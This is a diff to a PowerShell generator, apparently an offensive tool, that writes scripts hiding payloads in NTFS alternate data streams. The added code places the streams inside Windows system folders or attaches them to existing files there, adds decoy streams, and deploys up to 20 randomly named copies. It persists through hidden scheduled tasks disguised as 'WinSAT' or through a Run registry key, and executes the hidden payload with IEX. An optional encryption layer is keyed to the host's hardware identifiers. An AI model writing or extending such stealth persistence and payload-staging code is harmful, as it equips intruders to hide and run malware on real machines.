@@ -75,6 +75,15 @@ param(
     [switch]$Encrypt,
     [switch]$Randomize,
     
+    # Deep placement - resolve path on target at runtime
+    [switch]$UseDeepPlacement,
+    # Attach to existing file on target instead of creating new
+    [switch]$AttachToExisting,
+    
+    # Multi-instance: deploy N independent copies with unique paths/tasks
+    [ValidateRange(1, 20)]
+    [int]$InstanceCount = 1,
+    
     [string]$OutputFile = "ads-payload.txt",
     [string]$ManifestDir = "./manifests"
 )
@@ -123,6 +132,8 @@ $params = @{
     Randomize = $Randomize
     Encrypt = $Encrypt
     CreateDecoys = $CreateDecoys
+    UseDeepPlacement = $UseDeepPlacement
+    AttachToExisting = $AttachToExisting
     GenerateOnly = $true
 }
 
@@ -139,6 +150,9 @@ Write-Host "[+] Configuration computed" -ForegroundColor Green
 Write-Host "    Host: $($config.HostPath)" -ForegroundColor Gray
 Write-Host "    Stream: $($config.StreamNameEscaped)" -ForegroundColor Gray
 Write-Host "    Task: $($config.TaskName)" -ForegroundColor Gray
+if ($InstanceCount -gt 1) {
+    Write-Host "    Instances: $InstanceCount (each gets unique path/stream/task)" -ForegroundColor Yellow
+}
 
 # Build minimal Windows commands
 Write-Host "[*] Building minimal deployment commands..." -ForegroundColor White
@@ -182,16 +196,16 @@ if ($Encrypt) {
     $minimalScript += $helperFunctions + "`n"
 }
 
-# Configuration variables
+# Configuration variables (fallback defaults — may be overridden per-instance)
 $minimalScript += @"
-# Configuration
-`$hp='$($config.HostPath)'
-`$sn=$($config.StreamNameEscaped)
-`$tn='$($config.TaskName)'
+# Configuration (fallback values)
+`$_hp0='$($config.HostPath)'
+`$_sn0=$($config.StreamNameEscaped)
+`$_tn0='$($config.TaskName)'
 
 "@
 
-# Payload handling
+# Payload handling (computed ONCE, before any loop)
 if ($PayloadAtDeployment) {
     $minimalScript += @"
 # Payload input
@@ -227,7 +241,7 @@ do{`$line=Read-Host;if(`$line){`$lines+=`$line}}while(`$line)
 "@
 }
 
-# Encryption handling
+# Encryption handling (computed ONCE)
 if ($Encrypt) {
     $minimalScript += @"
 # Encrypt payload
@@ -237,32 +251,86 @@ if ($Encrypt) {
 "@
 }
 
-# Create host file and write ADS
-$minimalScript += @"
-# Create ADS
+# ============================================================
+# DEPLOYMENT SECTION
+# ============================================================
+
+# Helper: deep placement directory list (shared by both paths)
+$deepDirsBlock = @'
+$_deepDirs = @(
+    "$env:ProgramData\Microsoft\Windows\WER\ReportQueue",
+    "$env:ProgramData\Microsoft\Windows\WER\Temp",
+    "$env:LOCALAPPDATA\Microsoft\Windows\Caches",
+    "$env:LOCALAPPDATA\Microsoft\Windows\WebCache",
+    "$env:WINDIR\Temp",
+    "$env:ProgramData\Microsoft\Diagnosis",
+    "$env:ProgramData\Microsoft\Windows\Power Efficiency Diagnostics",
+    "$env:ProgramData\Microsoft\Network\Downloader"
+)
+$_validDirs = $_deepDirs | Where-Object { Test-Path $_ }
+'@
+
+# Helper: attach-to-existing logic
+$attachBlock = @'
+$_found = $false
+foreach ($_dir in ($_validDirs | Get-Random -Count ([Math]::Min(3, $_validDirs.Count)))) {
+    $_candidate = Get-ChildItem -Path $_dir -File -EA 0 |
+        Where-Object { $_.Length -gt 0 -and $_.Length -lt 5MB } |
+        Select-Object -First 10 | Get-Random
+    if ($_candidate) {
+        $hp = $_candidate.FullName
+        $_found = $true
+        break
+    }
+}
+'@
+
+# Helper: deep placement new-file logic
+$deepNewFileBlock = @'
+$_names = @('Report.wer','etl_data.log','WPR_initiated.dat','snapshot.etl','diag_report.xml','cache_entry.dat','qmgr0.dat','aria-debug.log')
+$hp = Join-Path ($_validDirs | Get-Random) ($_names | Get-Random)
+'@
+
+# Helper function: build the deep placement code for the generated script
+function Build-DeepPlacementCode {
+    $code = "# Runtime deep placement`n$deepDirsBlock`n"
+    if ($AttachToExisting) {
+        $code += "$attachBlock`n"
+        if ($UseDeepPlacement) {
+            $code += "if (-not `$_found -and `$_validDirs) {`n$deepNewFileBlock`n}`n"
+        } else {
+            $code += "if (-not `$_found -and `$_validDirs) {`n`$hp = Join-Path (`$_validDirs | Get-Random) ('cache_' + [guid]::NewGuid().ToString().Substring(0,6) + '.dat')`n}`n"
+        }
+    } elseif ($UseDeepPlacement) {
+        $code += "if (`$_validDirs) {`n$deepNewFileBlock`n}`n"
+    }
+    return $code
+}
+
+# Helper function: build ADS write + persistence for the generated script
+function Build-DeployBlock {
+    $block = @"
+# Create ADS (ensure parent dir exists)
+`$_pd=Split-Path `$hp -Parent;if(`$_pd -and !(Test-Path `$_pd)){ni `$_pd -ItemType Directory -Force|Out-Null}
 if(!(Test-Path `$hp)){ni `$hp -ItemType File -Force|Out-Null}
 `$pl|sc "`$hp``:`$sn" -Force
 
 "@
 
-# Create decoys
-if ($CreateDecoys -gt 0) {
-    $decoyNames = @('Zone.Identifier', 'Summary', 'Comments', 'Author')
-    $decoyContents = @('[ZoneTransfer]`r`nZoneId=3', 'Document summary', 'Internal use only', 'System')
-    
-    for ($i = 0; $i -lt [Math]::Min($CreateDecoys, $decoyNames.Count); $i++) {
-        $decoyContent = $decoyContents[$i]
-        $decoyName = $decoyNames[$i]
-        $minimalScript += "'$decoyContent'|sc `"`${hp}:$decoyName`" -Force`n"
+    # Decoys
+    if ($CreateDecoys -gt 0) {
+        $decoyNames = @('Zone.Identifier', 'Summary', 'Comments', 'Author')
+        $decoyContents = @('[ZoneTransfer]`r`nZoneId=3', 'Document summary', 'Internal use only', 'System')
+        for ($i = 0; $i -lt [Math]::Min($CreateDecoys, $decoyNames.Count); $i++) {
+            $block += "'$($decoyContents[$i])'|sc `"`${hp}:$($decoyNames[$i])`" -Force`n"
+        }
+        $block += "`n"
     }
-    $minimalScript += "`n"
-}
 
-# Persistence
-if ($Persist -eq 'task') {
-    if ($Encrypt) {
-        # Scheduled Encrypted task
-        $minimalScript += @"
+    # Persistence
+    if ($Persist -eq 'task') {
+        if ($Encrypt) {
+            $block += @"
 `$adsPath=`$hp+':'+`$sn
 `$taskCmd='function Get-HostKey{`$h=@(`$env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join''|'';[System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(`$h))};function Dec(`$d,`$k){`$b=[Convert]::FromBase64String(`$d);`$a=[Security.Cryptography.Aes]::Create();`$a.Key=`$k;`$a.IV=`$b[0..15];`$c=`$a.CreateDecryptor();`$t=`$b[16..(`$b.Length-1)];`$p=`$c.TransformFinalBlock(`$t,0,`$t.Length);[Text.Encoding]::UTF8.GetString(`$p)};`$k=Get-HostKey;`$e='''';gc '''+`$adsPath+'''|%{`$e+=`$_+[char]10};`$p=Dec `$e `$k;IEX `$p'
 `$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoP -W Hidden -C `$taskCmd"
@@ -273,9 +341,8 @@ if ($Persist -eq 'task') {
 Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Force|Out-Null
 
 "@
-    } else {
-        # Scheduled Unencrypted task
-        $minimalScript += @"
+        } else {
+            $block += @"
 `$adsPath=`$hp+':'+`$sn
 `$cmd="IEX((gc '`$adsPath')-join[char]10)"
 `$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoP -W Hidden -C `$cmd"
@@ -286,22 +353,78 @@ Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Fo
 Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Force|Out-Null
 
 "@
-    }
-} elseif ($Persist -eq 'registry') {
-    $minimalScript += @"
-# Registry persistence
+        }
+    } elseif ($Persist -eq 'registry') {
+        $block += @"
 Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name `$tn -Value "powershell.exe -NoP -W Hidden -C `"IEX(gc '`$hp``:`$sn' -Raw)`""
 
 "@
+    }
+
+    return $block
 }
 
-# Final output message (skip immediate execution if encrypted - would just run ciphertext)
-if (-not $PayloadAtDeployment -and -not $Encrypt) {
+if ($InstanceCount -gt 1) {
+    # ============================================================
+    # MULTI-INSTANCE PATH
+    # ============================================================
+    Write-Host "[*] Building multi-instance deployment ($InstanceCount instances)..." -ForegroundColor Yellow
+
     $minimalScript += @"
+# Multi-instance deployment: $InstanceCount independent copies
+`$_instanceCount=$InstanceCount
+for(`$_i=0;`$_i -lt `$_instanceCount;`$_i++){
+
+# Per-instance: unique stream name and task name
+`$sn = -join((65..90)+(97..122)|Get-Random -Count 8|ForEach-Object{[char]`$_})
+`$tn = 'WinSAT_' + (-join((65..90)|Get-Random -Count 6|ForEach-Object{[char]`$_}))
+
+"@
+
+    if ($UseDeepPlacement -or $AttachToExisting) {
+        $minimalScript += (Build-DeepPlacementCode) + "`n"
+    } else {
+        # No deep placement — randomize a ProgramData path per instance
+        $minimalScript += @'
+$hp = Join-Path $env:ProgramData (-join((65..90)+(97..122)|Get-Random -Count 8|ForEach-Object{[char]$_}))
+
+'@
+    }
+
+    $minimalScript += Build-DeployBlock
+
+    if (-not $PayloadAtDeployment -and -not $Encrypt) {
+        $minimalScript += "IEX `$pl`n"
+    }
+
+    $minimalScript += @"
+Write-Host "[+] Instance `$(`$_i+1)/$InstanceCount deployed" -ForegroundColor Green
+}
+
+"@
+
+} else {
+    # ============================================================
+    # SINGLE INSTANCE PATH (original behavior + deep placement)
+    # ============================================================
+
+    # Use config defaults
+    $minimalScript += "`$hp=`$_hp0;`$sn=`$_sn0;`$tn=`$_tn0`n`n"
+
+    if ($UseDeepPlacement -or $AttachToExisting) {
+        Write-Host "[*] Adding runtime deep placement logic..." -ForegroundColor Yellow
+        $minimalScript += (Build-DeepPlacementCode) + "`n"
+    }
+
+    $minimalScript += Build-DeployBlock
+
+    if (-not $PayloadAtDeployment -and -not $Encrypt) {
+        $minimalScript += @"
 # Execute payload immediately
 IEX `$pl
 
 "@
+    }
 }
 
 $minimalScript += @"
@@ -324,7 +447,7 @@ if (-not $PayloadAtDeployment) {
     $timestamp = Get-Date -Format "yyyyMMdd-HHmmss"
     $manifestFile = Join-Path $ManifestDir "manifest-$timestamp.json"
     
-    $payloadHash = (Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes($Payload))) -Algorithm SHA256).Hash
+    $payloadHash = (Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes($(if ($actualPayload) { $actualPayload } else { $Payload })))) -Algorithm SHA256).Hash
     
     $manifest = @{
         Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss UTC"
@@ -338,6 +461,9 @@ if (-not $PayloadAtDeployment) {
         Encrypted = $Encrypt.IsPresent
         DecoysCount = $CreateDecoys
         Randomized = $Randomize.IsPresent
+        DeepPlacement = $UseDeepPlacement.IsPresent
+        AttachToExisting = $AttachToExisting.IsPresent
+        InstanceCount = $InstanceCount
         PayloadHash = $payloadHash
         Operator = $env:USER
         GeneratedOn = hostname
@@ -366,6 +492,9 @@ CONFIGURATION:
   Decoys: $CreateDecoys
   Encryption: $($Encrypt.IsPresent)
   Randomized: $($Randomize.IsPresent)
+  Deep Placement: $($UseDeepPlacement.IsPresent)
+  Attach to Existing: $($AttachToExisting.IsPresent)
+  Instances: $InstanceCount$(if($InstanceCount -gt 1){" (each gets unique path/stream/task at runtime)"})
   
 PAYLOAD SIZE:
   Readable: $($minimalScript.Length) characters
